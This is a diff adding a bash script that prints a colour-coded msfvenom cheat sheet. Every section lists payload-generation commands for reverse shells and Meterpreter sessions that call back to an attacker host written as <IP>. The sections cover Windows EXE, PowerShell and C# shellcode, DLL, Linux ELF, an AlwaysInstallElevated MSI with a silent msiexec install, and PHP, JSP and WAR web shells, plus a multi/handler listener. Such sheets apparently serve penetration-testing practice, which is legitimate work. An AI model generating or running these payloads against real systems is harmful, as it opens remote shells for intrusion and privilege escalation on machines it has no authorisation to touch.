@@ -1,0 +1,63 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── MSFVENOM — PAYLOAD GENERATION ────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows Staged (Meterpreter) ─────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f exe -o shell.exe${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Windows Stageless (no stage fetch) ───────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f exe -o shell.exe${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── PowerShell Shellcode (for runners) ───────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 EXITFUNC=thread -f ps1${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f csharp${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Meterpreter Prepend Migrate ──────────────────────${NC}"
+echo -e "  Note: auto-migrate on exec"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 EXITFUNC=Thread prependmigrateprocess=explorer.exe prependmigrate=true -f ps1${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Linux ELF ────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IP> LPORT=443 -f elf -o shell.elf${NC}"
+echo -e "  ${GREEN}msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f elf -o shell.elf${NC}"
+echo -e "  ${GREEN}msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=tun0 LPORT=443 prependfork=true -f elf -o shell.elf${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── DLL ──────────────────────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<IP> LPORT=443 -f dll -o met.dll${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── MSI (AlwaysInstallElevated) ──────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=443 -f msi -o evil.msi${NC}"
+echo -e "  ${GREEN}msiexec /quiet /qn /i evil.msi${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Web Payloads ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o shell.php${NC}"
+echo -e "  ${GREEN}msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=443 -f raw -o shell.jsp${NC}"
+echo -e "  ${GREEN}msfvenom -p java/shell_reverse_tcp LHOST=<IP> LPORT=443 -f war -o shell.war${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Listener (multi/handler) ─────────────────────────${NC}"
+echo -e "  ${GREEN}msfconsole -q -x 'use multi/handler; set payload windows/x64/meterpreter/reverse_https; set LHOST <IP>; set LPORT 443; run'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── List Formats ─────────────────────────────────────${NC}"
+echo -e "  ${GREEN}msfvenom --list formats${NC}"
+echo -e "  ${GREEN}msfvenom --list payloads | grep windows/x64${NC}"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
